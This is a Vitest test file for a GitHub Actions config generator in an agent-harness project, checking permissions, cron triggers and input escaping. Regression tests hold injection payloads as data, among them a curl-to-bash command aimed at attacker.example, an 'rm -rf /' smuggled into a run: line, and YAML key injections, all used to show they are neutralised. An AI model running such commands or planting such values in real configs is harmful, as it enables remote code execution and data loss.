// SPDX-License-Identifier: MIT
import { describe, it, expect } from 'vitest';
import { execFileSync } from 'node:child_process';
import {
  HOST_NAME,
  ghaSlug,
  permissionsBlock,
  workflowYaml,
  actionYaml,
  installRunbook,
  adapter,
  looksLikeCron,
} from '../src/index.js';
import type { HarnessSpec } from '@metaharness/kernel';

const base: HarnessSpec = { name: 'My Bot', description: 'does things' };

describe('@metaharness/host-github-actions (ADR-033)', () => {
  it('exposes host name github-actions', () => {
    expect(HOST_NAME).toBe('github-actions');
    expect(adapter.name).toBe('github-actions');
  });

  describe('ghaSlug', () => {
    it('slugifies names safely', () => {
      expect(ghaSlug('My Bot')).toBe('my-bot');
      expect(ghaSlug('  Weird__Name!! ')).toBe('weird-name');
      expect(ghaSlug('')).toBe('harness');
    });
  });

  describe('permissionsBlock — default-deny (ADR-022)', () => {
    it('defaults to contents:read only', () => {
      expect(permissionsBlock(base)).toEqual({ contents: 'read' });
    });

    it('grants pull-requests:write + contents:write when allow implies PR', () => {
      const p = permissionsBlock({ ...base, permissions: { allow: ['create-pr'] } });
      expect(p.contents).toBe('write');
      expect(p['pull-requests']).toBe('write');
    });

    it('grants issues:write for label/triage capabilities', () => {
      const p = permissionsBlock({ ...base, permissions: { allow: ['label-issue'] } });
      expect(p.issues).toBe('write');
      // unrelated scopes stay denied (omitted)
      expect(p['pull-requests']).toBeUndefined();
    });

    it('unmapped allow tokens do not widen permissions', () => {
      const p = permissionsBlock({ ...base, permissions: { allow: ['Bash(ls)', 'Read'] } });
      expect(p).toEqual({ contents: 'read' });
    });
  });

  describe('workflowYaml', () => {
    const yml = workflowYaml(base);
    it('names the workflow with the slug', () => {
      expect(yml).toContain('name: my-bot');
    });
    it('has the safe default triggers (dispatch + issue_comment)', () => {
      expect(yml).toContain('workflow_dispatch: {}');
      expect(yml).toContain('issue_comment:');
    });
    it('emits a permissions block', () => {
      expect(yml).toContain('permissions:');
      expect(yml).toContain('contents: read');
    });
    it('calls the local composite action', () => {
      expect(yml).toContain('uses: ./.github/actions/my-bot');
    });
    it('reflects elevated permissions when the policy allows PRs', () => {
      const y = workflowYaml({ ...base, permissions: { allow: ['create-pr'] } });
      expect(y).toContain('contents: write');
      expect(y).toContain('pull-requests: write');
    });

    // Regression: `spec.name`/`spec.description` also land unescaped in the
    // header `#`-comment lines — a newline breaks out of the comment and
    // injects an arbitrary top-level YAML key into the document. Found by
    // an adversarial review pass of the run:-line fix above, in the same
    // case block.
    it('strips newlines from spec.name/description in the header comment lines', () => {
      const evil = 'evil-harness\nrun-name: pwned-by-attacker\n#';
      const y = workflowYaml({ name: evil, description: evil });
      const firstTwoLines = y.split('\n').slice(0, 2);
      expect(firstTwoLines).toEqual([
        '# GitHub Actions harness: evil-harness run-name: pwned-by-attacker #',
        '# evil-harness run-name: pwned-by-attacker #',
      ]);
      expect(y).not.toMatch(/^run-name:/m);
    });

    // Regression: the `- name: Run ${spec.name}` step-name line is a plain
    // YAML scalar mapping value (not a comment) — a newline there also
    // breaks the document. Closed with JSON.stringify() (the same
    // double-quoted-scalar pattern `description:` already uses), not
    // newline-stripping, since this is a value position, not a comment.
    it('JSON-escapes spec.name in the "Run <name>" step-name value', () => {
      const evil = 'evil-harness\nrun-name: pwned-by-attacker\n#';
      const y = workflowYaml({ name: evil, description: 'd' });
      const stepLine = y.split('\n').find((l) => l.includes('- name:'))!;
      expect(stepLine).toBe('      - name: "Run evil-harness\\nrun-name: pwned-by-attacker\\n#"');
      expect(y).not.toMatch(/^run-name:/m);
    });

    it('projects a cron-shaped autonomous.heartbeat.cadence onto a real schedule trigger', () => {
      const y = workflowYaml({
        ...base,
        autonomous: { heartbeat: { cadence: '0 9 * * 1', instruction: 'check in' } },
      } as HarnessSpec);
      expect(y).toContain('schedule:');
      expect(y).toContain("- cron: \"0 9 * * 1\"");
      expect(y).not.toContain('  # schedule:');
    });

    it('emits the trimmed cadence (surrounding whitespace is not carried into the cron string)', () => {
      const y = workflowYaml({
        ...base,
        autonomous: { heartbeat: { cadence: '  0 9 * * 1\n', instruction: 'check in' } },
      } as HarnessSpec);
      expect(y).toContain('- cron: "0 9 * * 1"');
    });

    it('falls back to the commented schedule example for a non-cron cadence (never emits an invalid trigger)', () => {
      const y = workflowYaml({
        ...base,
        autonomous: { heartbeat: { cadence: 'every 5 minutes', instruction: 'check in' } },
      } as HarnessSpec);
      expect(y).not.toMatch(/^ {2}schedule:/m);
      expect(y).toContain('  # schedule:');
    });

    it('projects autonomous.gateCommand onto a real pre-flight gating step (after checkout, before the harness step)', () => {
      const y = workflowYaml({ ...base, autonomous: { gateCommand: 'npm test' } } as HarnessSpec);
      expect(y).toContain('ADR-246 autonomous gate');
      expect(y).toContain('run: "npm test"');
      const lines = y.split('\n');
      const checkoutIdx = lines.findIndex((l) => l.includes('actions/checkout@v4'));
      const gateIdx = lines.findIndex((l) => l.includes('ADR-246 autonomous gate'));
      expect(gateIdx).toBeGreaterThan(checkoutIdx);
    });

    it('JSON-escapes gateCommand so a quote/newline cannot break the run: scalar', () => {
      const evil = 'npm test"\nrun: rm -rf /';
      const y = workflowYaml({ ...base, autonomous: { gateCommand: evil } } as HarnessSpec);
      expect(y).toContain(`run: ${JSON.stringify(evil)}`);
      expect(y).not.toMatch(/^run: rm -rf/m);
    });

    it('omits both the gate step and a real schedule trigger when autonomous is absent', () => {
      expect(yml).not.toContain('ADR-246 autonomous gate');
      expect(yml).not.toMatch(/^ {2}schedule:/m);
    });
  });

  describe('looksLikeCron', () => {
    it('accepts a 5-field cron expression', () => {
      expect(looksLikeCron('0 9 * * 1')).toBe(true);
      expect(looksLikeCron('*/5 * * * *')).toBe(true);
    });
    it('rejects a plain-English cadence', () => {
      expect(looksLikeCron('every 5 minutes')).toBe(false);
      expect(looksLikeCron('daily')).toBe(false);
    });
  });

  describe('actionYaml', () => {
    const yml = actionYaml(base);
    it('is a composite action with a task input + result output', () => {
      expect(yml).toContain('using: composite');
      expect(yml).toContain('task:');
      expect(yml).toContain('result:');
    });
    it('escapes the description', () => {
      expect(yml).toContain('description: "does things"');
    });

    // Regression: `spec.name` also lands unescaped inside a *double-quoted
    // bash string* in the `run:` line's "Running X (non-interactive)…"
    // message — a name containing `"` + shell metacharacters previously
    // broke out of the echo string and injected an arbitrary second shell
    // command into the emitted action.yml (this adapter has no name-format
    // gate of its own; only the CLI/web-UI's kebab-case check keeps it safe
    // on those paths). Same fix shape (shellDq()) as host-config.ts's and
    // the web-ui generator's copies — ADR-027 parity. Actually executes the
    // extracted `|` block-literal body through bash rather than just
    // checking for an escaped `"` in the string (an adversarial review of
    // the first draft found that string-only checks don't prove safety).
    it('neutralizes shell metacharacters in spec.name inside the run: block body', () => {
      const evil = 'harness"; curl -s http://attacker.example/x | bash #';
      const yml = actionYaml({ ...base, name: evil } as HarnessSpec);
      expect(yml).toContain('run: |\n');
      const body = yml.split('run: |\n')[1]!.split('\n')[0]!.trim();
      const out = execFileSync('bash', ['-c', body], { encoding: 'utf-8' });
      expect(out.trim()).toBe('Running harness"; curl -s http://attacker.example/x | bash # harness (non-interactive)…');
    });

    // Regression: `spec.name` also lands unescaped in actionYaml's own
    // header `#`-comment (`# Composite action for the ${spec.name}
    // harness...`) — a sibling of the workflowYaml header-comment gap fixed
    // above, missed in the first pass because it's one function away from
    // the site that was reviewed (caught by a second, targeted adversarial
    // review round). A newline in the name breaks out of the comment and
    // injects an arbitrary top-level YAML key into action.yml.
    it('strips newlines from spec.name in the actionYaml header comment', () => {
      const evil = 'evil-action\nauthor: pwned-by-attacker\n#';
      const yml = actionYaml({ ...base, name: evil } as HarnessSpec);
      expect(yml.split('\n')[0]).toBe('# Composite action for the evil-action author: pwned-by-attacker # harness (ADR-033).');
      expect(yml).not.toMatch(/^author:/m);
    });
  });

  describe('installRunbook', () => {
    const md = installRunbook(base);
    it('documents both emitted files + the permissions + prod-safety', () => {
      expect(md).toContain('.github/workflows/my-bot.yml');
      expect(md).toContain('.github/actions/my-bot/action.yml');
      expect(md).toContain('default-deny');
      expect(md).toContain('Environment');
    });

    it('never silently drops ADR-246 autonomous: projects gateCommand + cron heartbeat for real, discloses goal/maxTurns as a no-op', () => {
      const withAutonomous = installRunbook({
        ...base,
        autonomous: {
          goal: { text: 'ship it' },
          heartbeat: { cadence: '0 9 * * 1', instruction: 'check in' },
          gateCommand: 'npm test',
          maxTurns: 5,
        },
      } as HarnessSpec);
      expect(withAutonomous).toContain('ADR-246');
      expect(withAutonomous).toContain('Projected onto this host');
      expect(withAutonomous).toContain('gateCommand');
      expect(withAutonomous).toContain('heartbeat.cadence');
      expect(withAutonomous).toContain('Not projected');
      expect(withAutonomous).toContain('goal');
      expect(withAutonomous).toContain('maxTurns');
      expect(md).not.toContain('ADR-246');
    });

    it('discloses a non-cron heartbeat cadence as not projected instead of emitting an invalid trigger', () => {
      const withAutonomous = installRunbook({
        ...base,
        autonomous: { heartbeat: { cadence: 'every 5 minutes', instruction: 'check in' } },
      } as HarnessSpec);
      expect(withAutonomous).toContain('Not projected');
      expect(withAutonomous).toContain('heartbeat');
      expect(withAutonomous).not.toContain('Projected onto this host');
    });
  });

  describe('adapter.generateConfig', () => {
    const out = adapter.generateConfig(base);
    it('emits the workflow, the action, and install.md', () => {
      expect(Object.keys(out).sort()).toEqual([
        '.github/actions/my-bot/action.yml',
        '.github/workflows/my-bot.yml',
        'install.md',
      ]);
    });
    it('every emitted file is non-empty', () => {
      for (const v of Object.values(out)) expect(v.length).toBeGreaterThan(0);
    });
  });

  // ADR-044 — provider-agnostic key, system prompt, MCP wiring.
  describe('ADR-044 capability fixes', () => {
    it('workflow env is provider-agnostic (anthropic + openrouter + openai)', () => {
      const yml = workflowYaml(base);
      expect(yml).toContain('ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}');
      expect(yml).toContain('OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}');
      expect(yml).toContain('OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}');
    });

    it('action injects HARNESS_SYSTEM_PROMPT only when a system prompt is present', () => {
      expect(actionYaml(base)).not.toContain('HARNESS_SYSTEM_PROMPT');
      const withPrompt = actionYaml({ ...base, systemPrompt: 'Be terse.' } as HarnessSpec);
      expect(withPrompt).toContain('HARNESS_SYSTEM_PROMPT');
      expect(withPrompt).toContain('SYSTEM.md');
    });

    it('action adds an MCP step only when servers are declared', () => {
      expect(actionYaml(base)).not.toContain('mcp-servers.json');
      const withMcp = actionYaml({ ...base, mcpServers: [{ name: 'mem', command: ['node', 's.js'] }] } as HarnessSpec);
      expect(withMcp).toContain('mcp-servers.json');
    });

    it('generateConfig emits SYSTEM.md + mcp-servers.json when declared (gated)', () => {
      const out = adapter.generateConfig({
        name: 'My Bot', description: 'does things', systemPrompt: 'Be terse.',
        mcpServers: [{ name: 'mem', command: ['node', 's.js'] }],
      } as HarnessSpec);
      expect(Object.keys(out).sort()).toEqual([
        '.github/actions/my-bot/SYSTEM.md',
        '.github/actions/my-bot/action.yml',
        '.github/actions/my-bot/mcp-servers.json',
        '.github/workflows/my-bot.yml',
        'install.md',
      ]);
      expect(out['.github/actions/my-bot/SYSTEM.md']).toContain('Be terse.');
      expect(JSON.parse(out['.github/actions/my-bot/mcp-servers.json']!).mcpServers).toHaveLength(1);
    });
  });
});
